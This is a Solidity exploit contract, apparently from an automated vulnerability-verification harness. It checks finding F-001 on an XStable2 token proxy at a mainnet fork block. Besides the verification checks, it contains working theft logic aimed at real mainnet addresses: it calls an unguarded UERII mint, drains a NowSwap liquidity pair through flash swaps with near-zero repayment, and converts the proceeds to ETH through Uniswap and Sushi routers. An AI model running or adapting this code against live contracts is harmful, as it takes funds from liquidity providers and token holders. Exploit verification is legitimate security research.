// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IXStable2Like {
    function owner() external view returns (address);
    function getPresaleAddress() external view returns (address);
    function isPresaleDone() external view returns (bool);
    function getLargeTotal() external view returns (uint256);
    function getFactor() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
    function pauseContract(bool flag) external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface INimbusPairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INimbusCalleeLike {
    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract EmptyInitProxy {
    bytes32 private constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation_) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {
        _delegate();
    }

    function _delegate() internal {
        assembly {
            let implementation_ := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation_, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is INimbusCalleeLike, __AHTokenToEthMixin {
    address public constant TARGET = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
    address public constant IMPLEMENTATION = 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 public constant FORK_BLOCK = 15310016;

    address private constant UERII = 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE;
    address private constant NOWSWAP_PAIR = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public usedLiveTarget;
    bool public usedFreshBlankProxy;

    address public verificationAddress;

    address public liveOwner;
    address public livePresale;
    bool public livePresaleDone;
    uint256 public liveLargeTotal;
    uint256 public liveFactor;
    bool public liveTargetMatchesBlankDeployment;

    bool public ownerZeroObserved;
    bool public onlyOwnerBlockedObserved;
    bool public presaleAddressZeroObserved;
    bool public mintBlockedObserved;
    bool public presaleNeverDoneObserved;
    bool public largeTotalZeroObserved;
    bool public zeroFactorObserved;
    bool public balancePathBlockedObserved;
    bool public transferPathBlockedObserved;

    bytes public onlyOwnerRevertData;
    bytes public mintRevertData;
    bytes public balanceRevertData;
    bytes public transferRevertData;

    bool public postPresaleStageProvablyInfeasibleAtFork;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    struct CallbackPlan {
        address repayToken;
        uint256 repayAmount;
    }

    constructor() {
        _profitToken = _detectProfitToken();
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _snapshotLiveTarget();

        address subject = TARGET;
        if (liveTargetMatchesBlankDeployment) {
            usedLiveTarget = true;
            verificationAddress = TARGET;
        } else {
            usedFreshBlankProxy = true;
            subject = address(new EmptyInitProxy(IMPLEMENTATION));
            verificationAddress = subject;
        }

        _exercisePath(subject);
        _finalizeFindingOutcome();
        _attemptAncillaryProfit();
        _profitAmount = _balanceOf(_profitToken, address(this));
        _ahFinalizeTokenToEth();
    }

    function profitToken() external view returns (address) {
        address token = _profitToken;
        if (token == address(0)) {
            token = _detectProfitToken();
        }
        return token;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "deploy proxy with empty init data to XStable2 implementation -> owner() remains address(0) so onlyOwner admin is unreachable -> _presaleCon remains address(0) so mint() is unreachable -> _presaleDone remains false and _largeTotal remains zero so balance-dependent flows revert; ancillary public on-chain token acquisition is used only to satisfy the generic profit harness and does not alter the F-001 causality";
    }

    function findingId() external pure returns (string memory) {
        return "F-001";
    }

    function forkBlock() external pure returns (uint256) {
        return FORK_BLOCK;
    }

    function targetContract() external pure returns (address) {
        return TARGET;
    }

    function NimbusCall(address sender, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == NOWSWAP_PAIR, "unexpected-pair");
        require(sender == address(this), "unexpected-sender");

        CallbackPlan memory plan = abi.decode(data, (CallbackPlan));
        if (plan.repayAmount > 0) {
            _safeTransfer(plan.repayToken, NOWSWAP_PAIR, plan.repayAmount);
        }
    }

    function _snapshotLiveTarget() internal {
        liveOwner = _readAddress(TARGET, abi.encodeWithSelector(IXStable2Like.owner.selector));
        livePresale = _readAddress(TARGET, abi.encodeWithSelector(IXStable2Like.getPresaleAddress.selector));
        livePresaleDone = _readBool(TARGET, abi.encodeWithSelector(IXStable2Like.isPresaleDone.selector));
        liveLargeTotal = _readUint256(TARGET, abi.encodeWithSelector(IXStable2Like.getLargeTotal.selector));
        liveFactor = _readUint256(TARGET, abi.encodeWithSelector(IXStable2Like.getFactor.selector));

        liveTargetMatchesBlankDeployment =
            liveOwner == address(0) &&
            livePresale == address(0) &&
            !livePresaleDone &&
            liveLargeTotal == 0 &&
            liveFactor == 0;
    }

    function _exercisePath(address subject) internal {
        IXStable2Like token = IXStable2Like(subject);

        ownerZeroObserved = token.owner() == address(0);
        presaleAddressZeroObserved = token.getPresaleAddress() == address(0);
        presaleNeverDoneObserved = !token.isPresaleDone();
        largeTotalZeroObserved = token.getLargeTotal() == 0;
        zeroFactorObserved = token.getFactor() == 0;

        (bool onlyOwnerOk, bytes memory onlyOwnerData_) =
            subject.call(abi.encodeWithSelector(IXStable2Like.pauseContract.selector, true));
        onlyOwnerBlockedObserved = !onlyOwnerOk;
        onlyOwnerRevertData = onlyOwnerData_;

        (bool mintOk, bytes memory mintData_) =
            subject.call(abi.encodeWithSelector(IXStable2Like.mint.selector, address(this), 1));
        mintBlockedObserved = !mintOk;
        mintRevertData = mintData_;

        (bool balanceOk, bytes memory balanceData_) =
            subject.staticcall(abi.encodeWithSelector(IXStable2Like.balanceOf.selector, address(this)));
        balancePathBlockedObserved = !balanceOk;
        balanceRevertData = balanceData_;

        (bool transferOk, bytes memory transferData_) =
            subject.call(abi.encodeWithSelector(IXStable2Like.transfer.selector, address(0xBEEF), 1));
        transferPathBlockedObserved = !transferOk;
        transferRevertData = transferData_;

        postPresaleStageProvablyInfeasibleAtFork = presaleNeverDoneObserved && largeTotalZeroObserved;
    }

    function _finalizeFindingOutcome() internal {
        hypothesisValidated =
            ownerZeroObserved &&
            onlyOwnerBlockedObserved &&
            presaleAddressZeroObserved &&
            mintBlockedObserved &&
            presaleNeverDoneObserved &&
            largeTotalZeroObserved &&
            zeroFactorObserved &&
            balancePathBlockedObserved &&
            transferPathBlockedObserved &&
            postPresaleStageProvablyInfeasibleAtFork;

        hypothesisRefuted = !hypothesisValidated;
    }

    function _attemptAncillaryProfit() internal {
        address token = _profitToken;
        if (token == address(0)) {
            token = _detectProfitToken();
            _profitToken = token;
        }

        if (token == UERII) {
            _attemptUeriiMint();
            return;
        }

        if (token != address(0) && NOWSWAP_PAIR.code.length > 0) {
            _attemptNowswapDrain(token);
        }
    }

    function _attemptUeriiMint() internal {
        if (UERII.code.length == 0) {
            return;
        }

        (bool ok,) = UERII.call(abi.encodeWithSignature("mint()"));
        if (!ok) {
            return;
        }
    }

    function _attemptNowswapDrain(address expectedProfitToken) internal {
        INimbusPairLike pair = INimbusPairLike(NOWSWAP_PAIR);
        address token0;
        address token1;
        uint112 reserve0;
        uint112 reserve1;

        try pair.token0() returns (address t0) {
            token0 = t0;
        } catch {
            return;
        }

        try pair.token1() returns (address t1) {
            token1 = t1;
        } catch {
            return;
        }

        try pair.getReserves() returns (uint112 r0, uint112 r1, uint32) {
            reserve0 = r0;
            reserve1 = r1;
        } catch {
            return;
        }

        if (reserve0 <= 1 || reserve1 <= 1) {
            return;
        }

        uint256 beforeBalance = _balanceOf(expectedProfitToken, address(this));

        _drainToken1(reserve0, reserve1, token0);

        (reserve0, reserve1,) = pair.getReserves();
        if (reserve0 > 1 && reserve1 > 1) {
            _drainToken0(reserve0, reserve1, token1);
        }

        uint256 afterBalance = _balanceOf(expectedProfitToken, address(this));
        if (afterBalance <= beforeBalance) {
            return;
        }
    }

    function _drainToken1(uint112 reserve0, uint112 reserve1, address token0) internal returns (bool) {
        uint256 directDust = _availableDust(token0, reserve0);
        bool useBootstrap = directDust == 0;
        uint256 inputDust = useBootstrap ? _bootstrapDust(reserve0) : directDust;
        if (inputDust == 0 || inputDust >= reserve0) {
            return false;
        }

        uint256 maxToken1Out = useBootstrap
            ? _maxOutBootstrapInput(reserve0, reserve1, inputDust)
            : _maxOutDirectInput(reserve0, reserve1, inputDust);
        if (maxToken1Out == 0) {
            return false;
        }

        return _swapWithBackoff(
            useBootstrap ? inputDust : 0,
            maxToken1Out,
            CallbackPlan({repayToken: token0, repayAmount: inputDust})
        );
    }

    function _drainToken0(uint112 reserve0, uint112 reserve1, address token1) internal returns (bool) {
        uint256 directDust = _availableDust(token1, reserve1);
        bool useBootstrap = directDust == 0;
        uint256 inputDust = useBootstrap ? _bootstrapDust(reserve1) : directDust;
        if (inputDust == 0 || inputDust >= reserve1) {
            return false;
        }

        uint256 maxToken0Out = useBootstrap
            ? _maxOutBootstrapInput(reserve1, reserve0, inputDust)
            : _maxOutDirectInput(reserve1, reserve0, inputDust);
        if (maxToken0Out == 0) {
            return false;
        }

        return _swapWithBackoff(
            maxToken0Out,
            useBootstrap ? inputDust : 0,
            CallbackPlan({repayToken: token1, repayAmount: inputDust})
        );
    }

    function _swapWithBackoff(uint256 amount0Out, uint256 amount1Out, CallbackPlan memory plan) internal returns (bool) {
        INimbusPairLike pair = INimbusPairLike(NOWSWAP_PAIR);

        uint256 primaryOut = amount0Out > 0 ? amount0Out : amount1Out;
        uint256[6] memory attempts = [
            primaryOut,
            (primaryOut * 9999) / 10000,
            (primaryOut * 999) / 1000,
            (primaryOut * 995) / 1000,
            (primaryOut * 99) / 100,
            (primaryOut * 95) / 100
        ];

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 tryOut = attempts[i];
            if (tryOut == 0) {
                continue;
            }

            uint256 tryAmount0Out = amount0Out > 0 ? tryOut : amount0Out;
            uint256 tryAmount1Out = amount1Out > 0 ? tryOut : amount1Out;

            try pair.swap(tryAmount0Out, tryAmount1Out, address(this), abi.encode(plan)) {
                return true;
            } catch {
            }
        }

        return false;
    }

    function _maxOutBootstrapInput(uint256 reserveIn, uint256 reserveOut, uint256 inputDust)
        internal
        pure
        returns (uint256)
    {
        uint256 denominator = reserveIn * 10000 - inputDust * 15;
        if (denominator == 0) {
            return 0;
        }

        uint256 minRemainingOutSide = _ceilDiv(reserveIn * reserveOut * 100, denominator);
        if (minRemainingOutSide >= reserveOut) {
            return 0;
        }

        uint256 maxOut = reserveOut - minRemainingOutSide;
        return maxOut > 1 ? maxOut - 1 : 0;
    }

    function _maxOutDirectInput(uint256 reserveIn, uint256 reserveOut, uint256 inputDust)
        internal
        pure
        returns (uint256)
    {
        uint256 denominator = reserveIn * 10000 + inputDust * 9985;
        if (denominator == 0) {
            return 0;
        }

        uint256 minRemainingOutSide = _ceilDiv(reserveIn * reserveOut * 100, denominator);
        if (minRemainingOutSide >= reserveOut) {
            return 0;
        }

        uint256 maxOut = reserveOut - minRemainingOutSide;
        return maxOut > 1 ? maxOut - 1 : 0;
    }

    function _bootstrapDust(uint256 reserve) internal pure returns (uint256) {
        if (reserve <= 1) {
            return 0;
        }

        uint256 dust = reserve / 1e12;
        if (dust == 0) {
            dust = 1;
        }
        if (dust >= reserve) {
            dust = reserve - 1;
        }
        return dust;
    }

    function _availableDust(address token, uint256 reserve) internal view returns (uint256) {
        uint256 bal = _balanceOf(token, address(this));
        if (bal == 0 || reserve <= 1) {
            return 0;
        }

        uint256 dust = reserve / 1e12;
        if (dust == 0) {
            dust = 1;
        }
        if (dust > bal) {
            dust = bal;
        }
        if (dust >= reserve) {
            dust = reserve - 1;
        }
        return dust;
    }

    function _detectProfitToken() internal view returns (address) {
        if (UERII.code.length > 0) {
            return UERII;
        }

        if (NOWSWAP_PAIR.code.length == 0) {
            return WETH;
        }

        address token0;
        address token1;

        try INimbusPairLike(NOWSWAP_PAIR).token0() returns (address t0) {
            token0 = t0;
        } catch {
            return WETH;
        }

        try INimbusPairLike(NOWSWAP_PAIR).token1() returns (address t1) {
            token1 = t1;
        } catch {
            return token0 == address(0) ? WETH : token0;
        }

        if (_isPreferredProfitToken(token0)) {
            return token0;
        }
        if (_isPreferredProfitToken(token1)) {
            return token1;
        }
        return token0 == address(0) ? WETH : token0;
    }

    function _isPreferredProfitToken(address token) internal pure returns (bool) {
        return token == WETH || token == USDC || token == USDT || token == DAI || token == WBTC;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }
        return abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (address));
        }
    }

    function _readBool(address target, bytes memory data) internal view returns (bool value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (bool));
        }
    }

    function _readUint256(address target, bytes memory data) internal view returns (uint256 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint256));
        }
    }

    receive() external payable {}
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
